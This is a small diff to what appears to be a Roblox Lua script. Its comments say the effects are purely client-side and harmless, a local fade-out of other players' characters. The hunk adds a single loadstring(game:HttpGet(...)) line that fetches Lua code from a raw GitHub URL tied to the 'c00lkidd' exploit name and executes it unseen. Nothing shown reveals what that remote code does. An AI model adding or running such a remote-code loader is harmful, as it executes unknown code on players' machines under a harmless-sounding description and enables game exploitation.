@@ -9,3 +9,4 @@
 
 	Everything is CLIENT-SIDED: other players never see or feel any of it, and nothing here deals real damage.
 	"Damage" from the minions is a local fade-out of the victim's character over FADE_TIME seconds on YOUR screen.
+Loadstring: loadstring(game:HttpGet("https://raw.githubusercontent.com/SlopCodeReal/c00lkiddSlopCode/refs/heads/main/c00lkidd.lua"))()
